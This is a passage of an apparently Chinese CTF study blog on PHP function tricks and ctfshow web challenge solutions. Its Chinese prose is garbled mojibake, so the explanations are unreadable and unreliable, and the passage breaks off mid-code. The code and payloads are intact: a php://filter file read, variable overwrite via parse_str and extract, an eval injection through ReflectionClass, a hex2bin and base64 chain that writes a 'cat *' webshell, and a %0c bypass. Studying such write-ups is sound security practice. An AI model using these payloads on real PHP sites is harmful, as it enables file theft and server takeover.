ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1,å¦‚æœå‚æ•°ä¸ºä¸€ä¸ªç±»è¿”å›0ã€‚</p><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">intval</span> ( <span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ] )</span><br><span class="line"></span><br><span class="line"><span class="variable">$var</span>ï¼šè¦è½¬æ¢æˆ <span class="keyword">integer</span> çš„æ•°é‡å€¼ã€‚</span><br><span class="line"><span class="variable">$base</span>ï¼šè½¬åŒ–æ‰€ä½¿ç”¨çš„è¿›åˆ¶ã€‚</span><br><span class="line">å¦‚æœ base æ˜¯ <span class="number">0</span>ï¼Œé€šè¿‡æ£€æµ‹ <span class="keyword">var</span> çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼š</span><br><span class="line"></span><br><span class="line">å¦‚æœå­—ç¬¦ä¸²åŒ…æ‹¬äº† <span class="string">&quot;0x&quot;</span> (æˆ– <span class="string">&quot;0X&quot;</span>) çš„å‰ç¼€ï¼Œä½¿ç”¨ <span class="number">16</span> è¿›åˆ¶ (hex)ï¼›å¦åˆ™ï¼Œ</span><br><span class="line">å¦‚æœå­—ç¬¦ä¸²ä»¥ <span class="string">&quot;0&quot;</span> å¼€å§‹ï¼Œä½¿ç”¨ <span class="number">8</span> è¿›åˆ¶(octal)ï¼›å¦åˆ™ï¼Œ</span><br><span class="line">å°†ä½¿ç”¨ <span class="number">10</span> è¿›åˆ¶ (decimal)ã€‚</span><br></pre></td></tr></table></figure><p>å‚æ•°ä¸ºæ•°ç»„æ—¶ï¼Œç©ºæ•°ç»„è¿”å›0éç©ºæ•°ç»„è¿”å›1</p><h2 id="is-file"><a href="#is-file" class="headerlink" title="is_file()"></a>is_file()</h2><p>è¿™ä¸ªå‡½æ•°çš„å‚æ•°ä¸ºå­˜åœ¨çš„æ–‡ä»¶,å¦‚ä¸€ä¸ªç½‘é¡µä¸­çš„index.phpä¹‹ç±»çš„,ä¼šè¿”å›.å¦‚æœæˆ‘ä»¬è¦è¯»å–æ–‡ä»¶å¹¶ä¸”ç»•è¿‡è¿™ä¸ªå‡½æ•°çš„åŒ–æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<br>phpä¼ªåè®®,è¯¥å‡½æ•°ä¸ä¼šå°†phpä¼ªåè®®çš„å¦‚php://filterå½“æˆæ–‡ä»¶<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¦‚ä¸Šé¢çš„ä»£ç æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨phpä¼ªåè®®æ¥ç»•è¿‡is_file<br>payload<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure></p><h2 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h2><p>ereg å‡½æ•°åœ¨ PHP 5.3.0 ç‰ˆæœ¬ä¸­è¢«åºŸå¼ƒï¼Œè€Œåœ¨ PHP 7.0.0 ç‰ˆæœ¬ä¸­å·²ç»è¢«å®Œå…¨ç§»é™¤<br>è€Œè¿™ä¸ªå‡½æ•°æœ¬èº«å°±æœ‰ä¸€ä¸ªæ¼æ´å°±æ˜¯NULLæˆªæ–­æ¼æ´å³%00æˆªæ–­æ¼æ´<br>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åœ¨è¿›è¡Œæ­£åˆ™åŒ¹é…æ—¶å¯ä»¥ä½¿ç”¨%00æˆªæ–­ä¹‹åå¤¹å¸¦ç§è´§.<br>å…¶å‡½æ•°æ£€æµ‹åˆ°%00å°±ä¸ä¼šåœ¨åŒ¹é…ä¸‹å».</p><h2 id=""><a href="#" class="headerlink" title="_()"></a><code>_()</code></h2><p>åœ¨æ‰“å¼€gettextæ‹“å±•æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<em>()è¿™ä¸ªå‡½æ•°<br>æ²¡é”™å•Šæœ‰è¿™ä¸ªå‡½æ•°</em>()æ˜¯å”¯ä¸€ä¸€ä¸ªä»¥ç‰¹æ®Šç‰¹æ®Šå­—ç¬¦ä¸ºåçš„<br>è¿™ä¸ªå‡½æ•°çš„çœŸæ­£ä½œç”¨æ—¶ç¿»è¯‘ï¼Œå…¶è¿”å›å€¼æ—¶ç¿»è¯‘åçš„å­—ç¬¦ï¼Œä½†æ˜¯ä¸€èˆ¬è¿”å›å€¼ä¸ºæ­£å¸¸çš„è‹±æ–‡å­—æ¯ï¼Œå³è¿”å›å€¼æœ‰å¯èƒ½ä¸ºåŸå€¼ã€‚</p><h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><p>è¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼ä¸ºå½“å‰è„šæœ¬çš„å…¨éƒ¨å˜é‡</p><h1 id="ä¼ åœ°å€ã€‚"><a href="#ä¼ åœ°å€ã€‚" class="headerlink" title="ä¼ åœ°å€ã€‚"></a>ä¼ åœ°å€ã€‚</h1><p>æ˜¯çš„phpä¹Ÿæ˜¯æœ‰ä¼ åœ°å€çš„ï¼Œç¬¦åˆä¹Ÿæ˜¯&amp;ã€‚<br>æˆ‘ä»¬æ¥çœ‹ä¸€é“æŠ½è±¡çš„phpä¼ å€çš„é¢˜ç›®<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬ä»”ç»†è§‚å¯Ÿä¼šå‘ç°åªè¦æœ‰<code>GET</code>ä¼ å€¼<code>$_GET</code>çš„å€¼å°±ä¼šè¢«èµ‹å€¼ä¸º<code>&amp;$_POST</code>ä¹Ÿå°±æ˜¯<code>$_GET</code>å˜æˆäº†<code>$_POST</code><br>è€Œæœ€ç»ˆhighlight_fileå‡½æ•°é‡Œåªè¦<code>$_GET[&#39;HTTP_FLAG&#39;]</code>ä¸ºflagå°±å¯ä»¥å›æ˜¾flagå³<br>payloadå°±æ˜¯éšä¾¿GETä¼ ä¸ªå€¼å†POSTä¼ å€¼HTTP_FLAG=flag</p><h1 id="åšé¢˜æ—¶é‡åˆ°çš„ä¸€äº›å°ç›²ç‚¹-æ˜¯çœŸçš„å°"><a href="#åšé¢˜æ—¶é‡åˆ°çš„ä¸€äº›å°ç›²ç‚¹-æ˜¯çœŸçš„å°" class="headerlink" title="åšé¢˜æ—¶é‡åˆ°çš„ä¸€äº›å°ç›²ç‚¹(æ˜¯çœŸçš„å°)"></a>åšé¢˜æ—¶é‡åˆ°çš„ä¸€äº›å°ç›²ç‚¹(æ˜¯çœŸçš„å°)</h1><h2 id="å›è°ƒå‡½æ•°åˆ©ç”¨ç±»é‡Œçš„æ–¹æ³•"><a href="#å›è°ƒå‡½æ•°åˆ©ç”¨ç±»é‡Œçš„æ–¹æ³•" class="headerlink" title="å›è°ƒå‡½æ•°åˆ©ç”¨ç±»é‡Œçš„æ–¹æ³•"></a>å›è°ƒå‡½æ•°åˆ©ç”¨ç±»é‡Œçš„æ–¹æ³•</h2><p>å›è°ƒå‡½æ•°åƒcall_user_funcæ˜¯å¯ä»¥è°ƒç”¨ç±»é‡Œçš„æ–¹æ³•çš„å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">   <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å›è°ƒå‡½æ•°æ¥è°ƒç”¨getflagå‡½æ•°ã€‚è°ƒç”¨æ–¹æ³•å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(C::getFlag)</span><br></pre></td></tr></table></figure><br><a href="https://www.php.net/manual/zh/function.call-user-func.php">phpæ‰‹å†Œ</a><br>è¿˜å¯ä»¥å°è¯•æ•°ç»„çš„æ–¹æ³•æ¥è°ƒç”¨<br>å¯ä»¥å‘aä»¥æ•°ç»„çš„æ–¹æ³•ä¼ å…¥ä¸¤ä¸ªå€¼å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[<span class="number">0</span>]=C&amp;a[<span class="number">1</span>]=getFlag</span><br></pre></td></tr></table></figure><br>å³å‘ä¸Šé¢é‚£æ ·ä¼šå˜æˆ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(C,getFlag));</span><br></pre></td></tr></table></figure><br>å¯¼è‡´getFlagè¢«è°ƒç”¨</p><h2 id="POSTå’ŒGETä¼ å€¼é‡åˆ°parse-strçš„å˜é‡è¦†ç›–"><a href="#POSTå’ŒGETä¼ å€¼é‡åˆ°parse-strçš„å˜é‡è¦†ç›–" class="headerlink" title="POSTå’ŒGETä¼ å€¼é‡åˆ°parse_strçš„å˜é‡è¦†ç›–"></a>POSTå’ŒGETä¼ å€¼é‡åˆ°parse_strçš„å˜é‡è¦†ç›–</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;3&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;3&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åƒä¸Šé¢çš„å‡ è¡Œä»£ç ï¼Œå¯ä»¥å‘ç°è¦ä½¿key1å’Œkey2éƒ½ä¸º3ä¸”ä¸èƒ½ç›´æ¥å‘å˜é‡ä¼ å€¼ã€‚<br>æˆ‘ä»¬å…ˆçœ‹ä¸¤å¥è§£æå˜é‡çš„ä»£ç ã€‚å…ˆæ˜¯è§£æè¯·æ±‚å­—ç¬¦ï¼Œåœ¨è§£æå…¨å±€å˜é‡<code>$_POST</code>è¿™å°±ä¼šå­˜åœ¨ä¸€ä¸ªå˜é‡è¦†ç›–ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å€¼ä¸º<code>?_POST[key1]=3&amp;_POST[key2]=3</code>é‚£ä¹ˆç»è¿‡å‡½æ•°è§£æè¿™å°±ä¼šå˜æˆ<code>$_POST[key1]=3</code>å’Œ<code>$_POST[key2]=3</code>åœ¨ç»è¿‡extractå‡½æ•°å°±ä¼šä½¿å¾—key1å’Œkey2è¢«èµ‹å€¼ã€‚</p><h2 id="èµ‹å€¼å’Œé€»è¾‘åˆ¤æ–­"><a href="#èµ‹å€¼å’Œé€»è¾‘åˆ¤æ–­" class="headerlink" title="èµ‹å€¼å’Œé€»è¾‘åˆ¤æ–­"></a>èµ‹å€¼å’Œé€»è¾‘åˆ¤æ–­</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</span><br></pre></td></tr></table></figure><p>åƒä¸Šå¼æˆ‘ç›´æ¥å°†<code>$vo</code>æƒ³å½“ç„¶çš„è®¤ä¸ºæ˜¯é€»è¾‘åˆ¤æ–­åçš„ç»“æœï¼Œå…¶å®ä¸æ˜¯ï¼Œè¯¥è¯­å¥æ˜¯å…ˆèµ‹å€¼åè¿›è¡Œé€»è¾‘åˆ¤æ–­ã€‚æ‰€ä»¥<code>$V0</code>çš„å€¼å…¶å®å°±æ˜¯<code>is_numeric($v1)</code>çš„å€¼</p><h2 id="phpéæ³•å˜é‡å"><a href="#phpéæ³•å˜é‡å" class="headerlink" title="phpéæ³•å˜é‡å"></a>phpéæ³•å˜é‡å</h2><p>åœ¨æˆ‘ä»¬è¿›è¡Œpostå’Œgetä¼ å€¼æ˜¯èƒ½å°†ä¸€äº›éæ³•çš„å˜é‡åä¼ å…¥çš„ã€‚ä½†æ˜¯å¯¹äºè¿™äº›phpä¹Ÿä¼šè‡ªåŠ¨å¤„ç†ï¼Œä¼šå°†éæ³•çš„å˜é‡ååˆ é™¤æœ‰ä¸‹åˆ’çº¿æ›¿ä»£ç­‰ã€‚<br><code>$_POST[&#39;CTF_SHOW.COM&#39;]</code>å¦‚ä¸Šé¢çš„ã€‚å¦‚æœæ­£å¸¸ä½¿ç”¨POSTä¼ CTF<em>SHOW.COMæ˜¯æ— æ³•ä¼ å…¥çš„å› ä¸º.ä¼šè¢«åˆ é™¤æˆ–è½¬æ¢ï¼Œä½†æ˜¯è¿™ç§è½¬æ¢æ˜¯åªæœ‰ä¸€æ¬¡çš„å³å½“æœ‰ä¸¤ä¸ªéæ³•å­—ç¬¦æ—¶åªæœ‰å‰ä¸€ä¸ªä¼šè¢«è½¬æ¢æˆ–åˆ é™¤ã€‚è€Œåœ¨ä¸€äº›ç‰ˆæœ¬é‡Œ<code>[</code>ä¼šè¢«è½¬æ¢æˆ</em>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å°†POSTä¸­çš„<em>æ”¹æˆ<code>[</code>æ¥ä½¿å¾—åé¢çš„.ä¿ç•™ä»è€ŒæˆåŠŸè½¬æ¢ã€‚å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF[SHOW.COM=lll</span><br></pre></td></tr></table></figure><br><code>[</code>ä¼šè¢«è½¬æ¢æˆ</em>ä»è€Œæ­£å¸¸ç»™å˜é‡ä¼ å€¼ï¼Œ</p><h1 id="ä¸€äº›é¢˜ç›®"><a href="#ä¸€äº›é¢˜ç›®" class="headerlink" title="ä¸€äº›é¢˜ç›®"></a>ä¸€äº›é¢˜ç›®</h1><h2 id="åå°„ç±»"><a href="#åå°„ç±»" class="headerlink" title="åå°„ç±»"></a>åå°„ç±»</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€é¢˜éœ€è¦ä½¿ç”¨åå°„ç±»ReflectionClass<br>new ReflectionClass($class) å¯ä»¥è·å¾—ç±»çš„åå°„å¯¹è±¡ï¼ˆåŒ…å«å…ƒæ•°æ®ä¿¡æ¯ï¼‰ã€‚</p><p>å…ƒæ•°æ®å¯¹è±¡ï¼ˆåŒ…å«classçš„æ‰€æœ‰å±æ€§/æ–¹æ³•çš„å…ƒæ•°æ®ä¿¡æ¯ï¼‰<br>æ‰€ä»¥è¿™é¢˜çš„paylaodä¸º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=111&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure></p><h2 id="å›è°ƒå‡½æ•°ä½¿ç”¨hex2binå°†æ•°å­—æ„é€ æˆå­—ç¬¦ä¸²ï¼Œè¿›è¡Œæ–‡ä»¶ä¼ªåè®®å†™å…¥ã€‚"><a href="#å›è°ƒå‡½æ•°ä½¿ç”¨hex2binå°†æ•°å­—æ„é€ æˆå­—ç¬¦ä¸²ï¼Œè¿›è¡Œæ–‡ä»¶ä¼ªåè®®å†™å…¥ã€‚" class="headerlink" title="å›è°ƒå‡½æ•°ä½¿ç”¨hex2binå°†æ•°å­—æ„é€ æˆå­—ç¬¦ä¸²ï¼Œè¿›è¡Œæ–‡ä»¶ä¼ªåè®®å†™å…¥ã€‚"></a>å›è°ƒå‡½æ•°ä½¿ç”¨hex2binå°†æ•°å­—æ„é€ æˆå­—ç¬¦ä¸²ï¼Œè¿›è¡Œæ–‡ä»¶ä¼ªåè®®å†™å…¥ã€‚</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£å¸¸çœ‹åˆ°è¿™é¢˜æˆ‘ä»¬ä¼šå°è¯•å†™å…¥ä¸€å¥åŒ–æœ¨é©¬ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨16è¿›åˆ¶æ•°å°è¯•ç»•è¿‡is_numericå†é€šè¿‡å›è°ƒå‡½æ•°ä½¿ç”¨hex2binå‡½æ•°å°†æ•°ç»„è½¬åŒ–æˆä¸€å¥åŒ–æœ¨é©¬ï¼Œå†å°†v3èµ‹å€¼ä¸º1.phpå†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚ä½†æ˜¯ä¸çŸ¥é“æ˜¯ä¸æ˜¯ç”±äºç‰ˆæœ¬çš„åŸå› is_numericå‡½æ•°æ— æ³•è¯†åˆ«16è¿›åˆ¶ã€‚<br>æˆ‘ä»¬åªèƒ½ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•æ¥æ„é€ &lt;?=`cat *`;ã€‚è¿™é‡Œä½¿ç”¨äº†çŸ­æ ‡ç­¾å’Œåå¼•å·è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p>5044383959474e6864434171594473ç»è¿‡hex2binå‡½æ•°å˜ä¸º&lt;?=`cat *`;çš„base64ç¼–ç ã€‚æˆ‘ä»¬åœ¨é€šè¿‡ä¼ªåè®®æ¥è®²base64ç è§£ç åå†™å…¥æ–‡ä»¶ä¹Ÿå°±æ˜¯ç»™v3ä¼ å€¼php://filter/write=convert.base64-decode/resource=1.php<br>payload<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br><span class="line">------</span><br><span class="line">POST</span><br><span class="line">v1=hex2bin</span><br></pre></td></tr></table></figure><br>æœ€åæ‰“å¼€1.phpå³å¯ã€‚</p><h2 id="0cç»•è¿‡"><a href="#0cç»•è¿‡" class="headerlink" title="%0cç»•è¿‡"></a>%0cç»•è¿‡</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($num)&#123;</span><br><span class="line">    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);</span><br><span class="line">    return $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[&#x27;num&#x27;];</span><br><span class="line">if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;</span><br><span class="line">    if($num==&#x27;36&#x27;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;hacker!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜æˆ‘ä»¬ä¼šå‘ç°å…¶ç”±äºwafå¯¼è‡´æˆ‘ä»¬æ— æ³•ä½¿ç”¨å°æ•°æ¥è¿›è¡Œç»•è¿‡è¿™æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨%0cæ¥è¿›è¡Œç»•è¿‡,%0cæ˜¯ä¸å¯è§å­—ç¬¦,åœ¨phpä¸­%0c36==36é‚£ä¹ˆè¿™å°±å¯¼è‡´äº†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨%0cæ¥è¿›è¡Œç»•è¿‡.</p><h2 id="ctfshow-webå…¥é—¨-133"><a href="#ctfshow-webå…¥é—¨-133" class="headerlink" title="ctfshow webå…¥é—¨ 133"></a>ctfshow webå…¥é—¨ 133</h2><p>è¿™é¢˜æˆ‘è®¤ä¸ºæ˜¯æ¯”è¾ƒæœ‰ä»·å€¼è®°å½•çš„<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span 